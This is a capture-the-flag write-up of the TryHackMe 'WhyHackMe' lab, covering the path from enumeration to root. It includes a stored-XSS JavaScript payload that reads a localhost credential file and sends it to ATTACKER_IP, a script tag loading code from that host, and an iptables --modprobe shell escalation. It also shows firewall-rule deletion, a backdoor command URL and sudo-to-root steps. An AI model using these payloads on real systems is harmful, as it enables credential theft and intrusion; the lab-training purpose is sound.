---
layout: posts
title: "WhyHackMe CTF Writeup"
date: 2026-01-10
categories: writeups
tags: Linux 
exerpt: Dive into the depths of security and analysis with WhyHackMe.
difficulty: Medium
---

# TryHackMe: WhyHackMe Writeup
Today we are diving into the depths of security and analysis with the WhyHackMe challenge, everyone. This room involves a variety of techniques ranging from stored XSS and internal requests to network traffic analysis and exploiting backdoors.

---

### Progress Tracker / Attack Path

* **Reconnaissance:** Nmap scan identifies FTP, SSH, and HTTP.
* **Initial Discovery:** Anonymous FTP access reveals a note about a localhost-only credential file.
* **Vulnerability:** Stored XSS is discovered via the registration username field.
* **Exploitation (User):** XSS is leveraged to perform an internal request to retrieve credentials for the user `jack`.
* **Lateral Movement:** Analyzing a PCAP file and manipulating `iptables` to reveal a hidden service.
* **Privilege Escalation (www-data):** Exploiting a Python backdoor found via decrypted network traffic.
* **Root Access:** Utilizing permissive sudo rights to gain full control.

---

### Reconnaissance

The initial phase begins with a comprehensive scan of the target to identify open ports and services.

```
echo "TARGET_IP whyhackme.thm" >> /etc/hosts
nmap -v -p- TARGET_IP
```

The scan reveals the following open ports:
* **21/tcp**: FTP (vsftpd 3.0.3)
* **22/tcp**: SSH (OpenSSH 8.2p1)
* **80/tcp**: HTTP (Apache 2.4.41)
* **41312/tcp**: Filtered

#### Findings
* **FTP:** Anonymous login is enabled.
* **HTTP:** A web server is running on port 80.
* **Filtered Port:** Port 41312 is filtered, which suggests it might be protected by a firewall.

---

### Vulnerability Research: FTP & Web Enumeration

Logging into the FTP server anonymously provides access to a file named `update.txt`.

```
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
```

The content of `update.txt` states that the user account `mike` was compromised and replaced. The credentials for the new account are stored in `127.0.0.1/dir/pass.txt`, but the file is only accessible via localhost.

Next, a directory brute-force attack is performed on the web server using Gobuster.

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u whyhackme.thm -x php,html,js,txt -b 400-500
```

The scan identifies several interesting paths:
* `/blog.php`
* `/login.php`
* `/register.php`
* `/assets/`

---

### Exploitation: XSS-to-Internal-Request

Initial attempts at SQL injection on the login page and command injection in the comment section of `/blog.php` were unsuccessful. However, a vulnerability was found in the registration process.

#### Stored XSS via Username
By registering a new account with a payload as the username, such as `<script>alert('XSS')</script>`, the script executes when the username is rendered on the blog page. This occurs because the application reflects the username of the commenter without proper sanitization.



#### Reaching Localhost
Since we need to access `127.0.0.1/dir/pass.txt`, we can use the XSS vulnerability to make the admin's browser (which is monitoring the comments) fetch the internal file and send the contents to us.

1.  **Create a malicious script (xss.js):**
```
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function () {
  if (xhr.readyState == 4 && xhr.status == 200) {
    fetch("http://ATTACKER_IP:8000/steal?" + encodeURI(btoa(xhr.responseText)))
  }
};
xhr.open("GET", "http://127.0.0.1/dir/pass.txt", true);
xhr.send(null);
```

2.  **Inject the script via username:**
```
<script src="http://ATTACKER_IP:8000/xss.js"></script>
```

After the admin views the comment, the credentials for `jack` are captured: `j***:W************************K`. Using these credentials, you can log in via SSH and retrieve the first flag in `user.txt`.

---

### Rabbit Hole: Sudo Iptables

While enumerating as `jack`, it is discovered that the user has sudo permissions for `iptables`. A known technique involves using the `--modprobe` parameter to execute arbitrary commands, as detailed in this blog post: 

> **Room link:** [https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/
](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/
)

```
echo -e "/bin/bash -i" > exploit
chmod +x exploit
sudo iptables -L -t mangle --modprobe=./exploit
```

This method did not work in this specific environment, leading back to further enumeration of the file system.

---

### Escalation: Traffic Analysis

Further investigation reveals several critical files:
* **/var/www/html/config.php**: Contains MySQL database credentials.
* **/opt/urgent.txt**: A note stating that the server was hacked and suspicious files remain in `/usr/lib/cgi-bin/`. It also mentions using `iptables` to block the attacker.
* **/opt/capture.pcap**: A packet capture of the attacker's traffic.

#### Unblocking the Filtered Port
The `iptables` configuration is blocking port 41312. Since `jack` can modify `iptables`, the rule can be deleted.

```
sudo iptables -D INPUT -p tcp --dport 41312 -j DROP
```
This command deletes the specific firewall rule that drops incoming traffic on port 41312.

A new scan reveals the port is now open:
```
41312/tcp open  ssl/http Apache httpd 2.4.41
```

#### Decrypting the PCAP
The Apache configuration in `site-enabled/000-default.conf` points to SSL certificates and keys used for the workshop on port 41312. By importing these RSA keys into Wireshark, the encrypted TLS traffic in `capture.pcap` can be read.



Inside the decrypted traffic, a GET request to a backdoor is found:
```
GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=ls%20-al HTTP/1.1
```

---

### Root Escalation

The script `5UP3r53Cr37.py` acts as a remote command execution point. By substituting a reverse shell command into the `cmd` parameter, access is gained as the `www-data` user.

#### Final Privilege Escalation
Checking the sudo permissions for `www-data`:

```
sudo -l
```

The output shows that `www-data` can run any command with sudo without a password.

```
sudo su
```

This command switches the current user session to the root user. With root access, the final flag can be found in `/root/root.txt`.
